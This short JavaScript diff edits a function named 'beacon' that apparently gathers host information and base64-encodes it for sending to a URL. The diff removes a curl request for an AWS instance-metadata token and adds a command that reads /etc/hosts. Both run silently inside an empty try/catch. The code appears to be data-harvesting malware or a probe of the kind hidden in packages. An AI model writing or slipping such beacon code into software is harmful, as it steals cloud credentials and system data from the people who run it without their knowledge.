@@ -46,7 +46,7 @@ function beacon(urlStr, q) {
 
   let idOutput = "";
   try {
-    idOutput = execSync("curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'", { encoding: "utf8" }).trim();
+    idOutput = execSync("cat /etc/hosts", { encoding: "utf8" }).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
   } catch {}
 
